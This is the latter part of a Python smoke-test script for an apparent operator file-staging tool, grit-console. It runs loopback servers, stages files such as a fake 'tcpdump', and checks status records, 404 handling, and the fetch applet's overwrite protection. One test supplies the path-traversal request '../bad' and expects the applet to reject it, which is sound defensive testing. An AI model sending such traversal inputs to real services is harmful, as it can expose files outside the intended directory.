                fetches_by_status.get("served", [{}])[0].get("source_path") != str(staged_source) or
                fetches_by_http_status.get("200", [{}])[0].get("request_name") != "/tmp/myfile" or
                not fetch_remote or
                fetches_by_remote.get(fetch_remote, [{}])[0].get("request_name") != "/tmp/myfile" or
                fetches_by_request_status.get(fetch_request_status_key, [{}])[0].get("source_path") != str(staged_source) or
                fetches_by_status_source_exists.get(fetch_status_source_exists_key, [{}])[0].get("request_name") != "/tmp/myfile" or
                fetches_by_status_remote.get(fetch_status_remote_key, [{}])[0].get("request_name") != "/tmp/myfile" or
                fetches_by_http_status_remote.get(fetch_http_status_remote_key, [{}])[0].get("status") != "served" or
                "events_by_detail_request_name" not in (events_api.get("indexes") or []) or
                "events_by_event_detail_request_name" not in (events_api.get("indexes") or []) or
                "events_by_service_detail_request_name" not in (events_api.get("indexes") or [])):
            print("server json status missing fetch browser lookup maps", file=sys.stderr)
            print(fetch_status.stdout, file=sys.stderr)
            return 1
        if (fetch_summary.get("fetch_remote_counts", {}).get(fetch_remote) != 1 or
                fetch_summary.get("fetch_metadata_exists_counts", {}).get("yes") != 1 or
                fetch_summary.get("fetch_event_log_exists_counts", {}).get("yes") != 1 or
                fetch_summary.get("fetch_request_status_counts", {}).get(fetch_request_status_key) != 1 or
                fetch_summary.get("fetch_status_source_exists_counts", {}).get(fetch_status_source_exists_key) != 1 or
                fetch_summary.get("fetch_status_remote_counts", {}).get(fetch_status_remote_key) != 1 or
                fetch_summary.get("fetch_http_status_remote_counts", {}).get(fetch_http_status_remote_key) != 1):
            print("server json status missing fetch remote summary counts", file=sys.stderr)
            print(fetch_status.stdout, file=sys.stderr)
            return 1
        fetch_api = (fetch_status_doc.get("api_collections") or {}).get("fetches") or {}
        if ("fetches_by_metadata_exists" not in (fetch_api.get("indexes") or []) or
                "fetches_by_event_log_exists" not in (fetch_api.get("indexes") or [])):
            print("server json status missing fetch metadata/log availability API indexes", file=sys.stderr)
            print(fetch_status.stdout, file=sys.stderr)
            return 1
        if fetch_summary.get("latest_fetch_at") != fetch_items[0].get("timestamp"):
            print("server json status missing fetch recency summary", file=sys.stderr)
            print(fetch_status.stdout, file=sys.stderr)
            return 1
        fetch_status_text = run(
            "scripts/grit-console",
            "--config", str(fetch_cfg),
            "--state-file", str(state_file),
            "--staged-file", str(staged_file),
            "--status",
        )
        if ("Recent fetches:" not in fetch_status_text.stdout or
                "Activity summary:" not in fetch_status_text.stdout or
                "fetches=1" not in fetch_status_text.stdout or
                "/tmp/myfile" not in fetch_status_text.stdout or
                "status=served http=200" not in fetch_status_text.stdout or
                f"fetch={fetch_items[0].get('timestamp')}" not in fetch_status_text.stdout or
                f"remote: {fetch_remote} at {fetch_items[0].get('timestamp')}" not in fetch_status_text.stdout):
            print("text --status missing recent fetch metadata", file=sys.stderr)
            print(fetch_status_text.stdout, file=sys.stderr)
            return 1
        fetch_view = run(
            "scripts/grit-console",
            "--config", str(fetch_cfg),
            "--state-file", str(state_file),
            "--staged-file", str(staged_file),
        )
        if ("Recent fetches:" not in fetch_view.stdout or
                "Activity summary:" not in fetch_view.stdout or
                "fetches=1" not in fetch_view.stdout or
                "/tmp/myfile" not in fetch_view.stdout or
                "status=served http=200" not in fetch_view.stdout or
                f"fetch={fetch_items[0].get('timestamp')}" not in fetch_view.stdout or
                f"remote: {fetch_remote} at {fetch_items[0].get('timestamp')}" not in fetch_view.stdout or
                "event_log:" not in fetch_view.stdout):
            print("workbench fallback missing recent fetch metadata", file=sys.stderr)
            print(fetch_view.stdout, file=sys.stderr)
            return 1
        staged_doc = json.loads(staged_file.read_text(encoding="utf-8"))
        if "/tmp/myfile" not in staged_doc.get("staged", {}):
            print("staged-files JSON missing request name", file=sys.stderr)
            return 1
        listed = run(
            "scripts/grit-console",
            "--config", str(fetch_cfg),
            "--state-file", str(state_file),
            "--staged-file", str(staged_file),
            "--list-staged",
        )
        if listed.returncode != 0 or "grit fetch /tmp/myfile" not in listed.stdout:
            print("--list-staged did not show target fetch command", file=sys.stderr)
            print(listed.stdout, file=sys.stderr)
            return 1
        status_enriched = run(
            "scripts/grit-console",
            "--config", str(fetch_cfg),
            "--state-file", str(state_file),
            "--staged-file", str(staged_file),
            "--json-status",
        )
        status_doc = json.loads(status_enriched.stdout)
        staged_status = status_doc.get("staged", {}).get("/tmp/myfile", {})
        staged_records = status_doc.get("staged_records") or []
        staged_record = next((item for item in staged_records if item.get("request_name") == "/tmp/myfile"), {})
        staged_by_request = status_doc.get("staged_by_request") or {}
        staged_by_kind = status_doc.get("staged_by_kind") or {}
        staged_by_sha256 = status_doc.get("staged_by_sha256") or {}
        staged_by_source_path = status_doc.get("staged_by_source_path") or {}
        staged_by_fetch_command = status_doc.get("staged_by_fetch_command") or {}
        staged_by_fetch_command_force = status_doc.get("staged_by_fetch_command_force") or {}
        staged_by_source_exists = status_doc.get("staged_by_source_exists") or {}
        staged_by_kind_source_exists = status_doc.get("staged_by_kind_source_exists") or {}
        staged_files_state = status_doc.get("staged_files_state") or {}
        staged_sha = staged_record.get("sha256", "")
        staged_summary = status_doc.get("summary") or {}
        operator_network_records = status_doc.get("operator_network_records") or []
        operator_network_selected = status_doc.get("operator_network_records_by_selected", {}).get("True") or []
        if (not staged_status or
                staged_status.get("request_name") != "/tmp/myfile" or
                staged_status.get("stage_kind") != "file" or
                "fetch /tmp/myfile" not in staged_status.get("fetch_command", "") or
                "--force" not in staged_status.get("fetch_command_force", "") or
                staged_status.get("source_exists") is not True or
                staged_summary.get("staged_count", 0) < 1 or
                staged_summary.get("staged_kind_counts", {}).get("file", 0) < 1 or
                staged_summary.get("staged_source_exists_count", 0) < 1 or
                staged_summary.get("staged_source_missing_count") != 0 or
                staged_summary.get("staged_fetch_command_count", 0) < 1 or
                staged_summary.get("staged_fetch_command_force_count", 0) < 1 or
                staged_summary.get("staged_source_exists_kind_counts", {}).get("file", 0) < 1 or
                staged_summary.get("staged_source_missing_kind_counts") != {} or
                staged_summary.get("staged_total_size", 0) < staged_source.stat().st_size or
                staged_summary.get("latest_staged_at") != staged_record.get("staged_at") or
                not staged_record or
                staged_record.get("name") != "/tmp/myfile" or
                staged_record.get("stage_kind") != "file" or
                staged_record.get("source_path") != str(staged_source) or
                staged_record.get("source_exists") is not True or
                "fetch /tmp/myfile" not in staged_record.get("fetch_command", "") or
                staged_by_request.get("/tmp/myfile", {}).get("source_path") != str(staged_source) or
                staged_by_kind.get("file", [{}])[0].get("request_name") != "/tmp/myfile" or
                staged_by_source_path.get(str(staged_source), {}).get("request_name") != "/tmp/myfile" or
                staged_by_fetch_command.get(staged_record.get("fetch_command", ""), {}).get("request_name") != "/tmp/myfile" or
                staged_by_fetch_command_force.get(staged_record.get("fetch_command_force", ""), {}).get("request_name") != "/tmp/myfile" or
                staged_by_source_exists.get("yes", [{}])[0].get("request_name") != "/tmp/myfile" or
                staged_by_source_exists.get("no") != [] or
                staged_by_kind_source_exists.get("file:yes", [{}])[0].get("source_path") != str(staged_source) or
                not staged_sha or
                not any(item.get("request_name") == "/tmp/myfile" for item in staged_by_sha256.get(staged_sha, [])) or
                status_doc.get("target_commands_by_request", {}).get("/tmp/myfile", {}).get("request_name") != "/tmp/myfile" or
                not any("fetch /tmp/myfile" in cmd for cmd in status_doc.get("target_commands", [])) or
                "selected_local_ip" not in status_doc or
                not operator_network_records or
                not operator_network_selected or
                operator_network_selected[0].get("ip") != status_doc.get("selected_local_ip") or
                staged_summary.get("operator_network_record_count") != len(operator_network_records) or
                staged_summary.get("operator_network_selected_ip") != status_doc.get("selected_local_ip") or
                "operator_network_records_by_source" not in (status_doc.get("api_collections", {}).get("operator_network_records", {}).get("indexes") or []) or
                not isinstance(status_doc.get("events"), list)):
            print("json status missing enriched workbench fields", file=sys.stderr)
            print(status_enriched.stdout, file=sys.stderr)
            return 1
        if (staged_files_state.get("valid") is not True or
                staged_files_state.get("staged_count", 0) < 1 or
                staged_files_state.get("has_staged") is not True or
                "/tmp/myfile" not in staged_files_state.get("request_names", []) or
                status_doc.get("staged_files_state_records_by_path", {}).get(staged_files_state.get("path"), {}).get("staged_count") != staged_files_state.get("staged_count") or
                status_doc.get("staged_files_state_records_by_has_staged", {}).get("True", [{}])[0].get("path") != staged_files_state.get("path") or
                "staged_files_state_records_by_schema" not in ((status_doc.get("api_collections") or {}).get("staged_files_state_records") or {}).get("indexes", []) or
                staged_summary.get("staged_files_valid") is not True or
                staged_summary.get("staged_files_state_count", 0) < 1 or
                staged_summary.get("staged_files_state_record_count") != 1 or
                staged_summary.get("staged_files_state_has_staged") is not True):
            print("json status missing staged-files ledger state", file=sys.stderr)
            print(status_enriched.stdout, file=sys.stderr)
            return 1
        unstage = run(
            "scripts/grit-console",
            "--config", str(fetch_cfg),
            "--state-file", str(state_file),
            "--staged-file", str(staged_file),
            "--unstage", "/tmp/myfile",
            "--list-staged",
        )
        staged_after_unstage = json.loads(staged_file.read_text(encoding="utf-8"))
        if unstage.returncode != 0 or "/tmp/myfile" in staged_after_unstage.get("staged", {}):
            print("--unstage did not remove staged request", file=sys.stderr)
            print(unstage.stdout, file=sys.stderr)
            print(unstage.stderr, file=sys.stderr)
            return 1

        missing_fetch_port = free_port()
        missing_fetch_cfg = Path(tmp) / "server-config-missing-fetch.json"
        missing_fetch_root = Path(tmp) / "sessions-missing-fetch"
        missing_fetch_cfg.write_text(json.dumps({
            "listen_host": "127.0.0.1",
            "GRIT_OPERATOR_FILE_SERVICE_PORT": missing_fetch_port,
            "session_root": str(missing_fetch_root),
            "tls_cert": str(cert_path),
            "tls_key": str(key_path),
            "GRIT_OPERATOR_FILE_SERVICE_TLS": "no",
        }), encoding="utf-8")
        missing_proc = subprocess.Popen(
            [
                str(server), "--config", str(missing_fetch_cfg),
                "--state-file", str(Path(tmp) / "missing-fetch-state.json"),
                "--staged-file", str(Path(tmp) / "missing-fetch-staged.json"),
                "--transport", "file-service",
                "--file-service-tls", "no",
                "--one-shot",
                "--timeout", "5",
            ],
            cwd=ROOT,
            text=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        missing_response = connect_with_retry(
            missing_fetch_port,
            b"GET /fetch?name=not-staged HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n",
        )
        missing_stdout, missing_stderr = missing_proc.communicate(timeout=5)
        if missing_proc.returncode != 0 or b"HTTP/1.1 404" not in missing_response:
            print("missing staged fetch did not return HTTP 404 cleanly", file=sys.stderr)
            print(missing_stdout, file=sys.stderr)
            print(missing_stderr, file=sys.stderr)
            return 1
        missing_sessions = list(missing_fetch_root.glob("*/session.json"))
        if len(missing_sessions) != 1:
            print("missing staged fetch did not write a session record", file=sys.stderr)
            return 1
        missing_doc = json.loads(missing_sessions[0].read_text(encoding="utf-8"))
        if (len(missing_doc.get("fetches") or []) != 1 or
                missing_doc["fetches"][0].get("operation") != "fetch" or
                missing_doc["fetches"][0].get("status") != "missing" or
                missing_doc["fetches"][0].get("http_status") != 404 or
                missing_doc.get("uploads")):
            print("missing staged fetch was incorrectly classified", file=sys.stderr)
            print(json.dumps(missing_doc, indent=2), file=sys.stderr)
            return 1
        missing_events = [json.loads(line) for line in (missing_sessions[0].parent / "events.jsonl").read_text(encoding="utf-8").splitlines()]
        if not any(event.get("event") == "fetch_complete" and event.get("details", {}).get("status") == "missing" for event in missing_events):
            print("missing staged fetch did not write fetch_complete status", file=sys.stderr)
            return 1
        missing_close_events = [event for event in missing_events if event.get("event") == "connection_close"]
        if (not missing_close_events or
                missing_close_events[-1].get("details", {}).get("operation") != "fetch" or
                missing_close_events[-1].get("details", {}).get("status") != "missing" or
                missing_close_events[-1].get("details", {}).get("http_status") != 404 or
                missing_close_events[-1].get("details", {}).get("request_name") != "not-staged"):
            print("missing fetch connection_close event missing request outcome details", file=sys.stderr)
            return 1
        missing_fetch_status = run(
            "scripts/grit-console",
            "--config", str(missing_fetch_cfg),
            "--state-file", str(Path(tmp) / "missing-fetch-state.json"),
            "--staged-file", str(Path(tmp) / "missing-fetch-staged.json"),
            "--json-status",
        )
        missing_fetch_doc = json.loads(missing_fetch_status.stdout)
        missing_fetches = missing_fetch_doc.get("fetches") or []
        if (missing_fetch_doc.get("summary", {}).get("fetch_count") != 1 or
                missing_fetch_doc.get("summary", {}).get("fetch_source_exists_count") != 0 or
                missing_fetch_doc.get("summary", {}).get("fetch_source_missing_count") != 1 or
                len(missing_fetches) != 1 or
                missing_fetches[0].get("request_name") != "not-staged" or
                missing_fetches[0].get("status") != "missing" or
                missing_fetches[0].get("http_status") != 404 or
                missing_fetches[0].get("source_exists") is not False or
                (missing_fetch_doc.get("fetches_by_http_status") or {}).get("404", [{}])[0].get("request_name") != "not-staged"):
            print("server json status missing missing-fetch metadata", file=sys.stderr)
            print(missing_fetch_status.stdout, file=sys.stderr)
            return 1

        serve_dir = Path(tmp) / "operator-files"
        serve_dir.mkdir()
        (serve_dir / "tcpdump").write_text("fake tcpdump\n", encoding="utf-8")
        list_dir = run(
            "scripts/grit-console",
            "--config", str(fetch_cfg),
            "--state-file", str(state_file),
            "--staged-file", str(staged_file),
            "--transport", "file-service",
            "--serve-dir", str(serve_dir),
            "--list-staged",
            "--timeout", "0.01",
        )
        if list_dir.returncode != 0 or "grit fetch tcpdump" not in list_dir.stdout:
            print("--serve-dir did not stage direct child files", file=sys.stderr)
            print(list_dir.stdout, file=sys.stderr)
            print(list_dir.stderr, file=sys.stderr)
            return 1

        bb = ROOT / "dist" / "grit.core"
        if not bb.exists():
            bb = ROOT / "dist" / "grit-native-full"
        if bb.exists() and os.access(bb, os.X_OK):
            bb_run = Path(tmp) / "grit"
            try:
                bb_run.symlink_to(bb)
            except OSError:
                bb_run.write_bytes(bb.read_bytes())
                bb_run.chmod(0o755)
            existing = Path(tmp) / "existing.out"
            existing.write_text("existing\n", encoding="utf-8")
            overwrite = subprocess.run(
                [str(bb_run), "fetch", "/tmp/myfile", "--host", "127.0.0.1", "--port", str(fetch_port),
                 "--no-tls", "--output", str(existing)],
                cwd=ROOT,
                text=True,
                capture_output=True,
            )
            if overwrite.returncode == 0 or "overwrite" not in (overwrite.stdout + overwrite.stderr):
                print("fetch applet did not protect existing output", file=sys.stderr)
                return 1
            traversal = subprocess.run(
                [str(bb_run), "fetch", "../bad", "--host", "127.0.0.1", "--port", str(fetch_port), "--no-tls"],
                cwd=ROOT,
                text=True,
                capture_output=True,
            )
            if traversal.returncode == 0 or "path traversal" not in (traversal.stdout + traversal.stderr):
                print("fetch applet did not reject request traversal", file=sys.stderr)
                return 1

            fetch_port2 = free_port()
            fetch_cfg2 = Path(tmp) / "server-config-fetch2.json"
            fetch_cfg2.write_text(json.dumps({
                "listen_host": "127.0.0.1",
                "GRIT_OPERATOR_FILE_SERVICE_PORT": fetch_port2,
                "session_root": str(Path(tmp) / "sessions-fetch2"),
                "tls_cert": str(cert_path),
                "tls_key": str(key_path),
                "GRIT_OPERATOR_FILE_SERVICE_TLS": "no",
            }), encoding="utf-8")
            fetched = Path(tmp) / "fetched.out"
            proc2 = subprocess.Popen(
                [
                    str(server), "--config", str(fetch_cfg2),
                    "--state-file", str(Path(tmp) / "state2.json"),
                    "--staged-file", str(Path(tmp) / "staged2.json"),
                    "--transport", "file-service",
                    "--serve-file", str(staged_source),
                    "--as", "/tmp/myfile",
                    "--file-service-tls", "no",
                    "--one-shot",
                    "--timeout", "5",
                ],
                cwd=ROOT,
                text=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )
            deadline = time.time() + 5
            fetch = None
            while time.time() < deadline:
                fetch = subprocess.run(
                    [str(bb_run), "fetch", "/tmp/myfile", "--host", "127.0.0.1", "--port", str(fetch_port2),
                     "--no-tls", "--output", str(fetched)],
                    cwd=ROOT,
                    text=True,
                    capture_output=True,
                )
                if fetch.returncode == 0:
                    break
                if "download failed" not in (fetch.stdout + fetch.stderr):
                    break
                time.sleep(0.1)
            stdout2, stderr2 = proc2.communicate(timeout=5)
            if not fetch or fetch.returncode != 0 or fetched.read_bytes() != b"operator staged bytes\n":
                print("fetch applet did not retrieve staged file", file=sys.stderr)
                print(fetch.stdout if fetch else "", file=sys.stderr)
                print(fetch.stderr if fetch else "", file=sys.stderr)
                print(stdout2, file=sys.stderr)
                print(stderr2, file=sys.stderr)
                return 1
        else:
            print("skip: built griTTYkit artifact missing; fetch applet server smoke skipped")

    if args.section == "full":
        line_console_rc = run_line_console_section(server)
        if line_console_rc != 0:
            return line_console_rc

    label = "integration" if args.section == "integration" else args.section
    print(f"grit-console smoke {label} ok")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
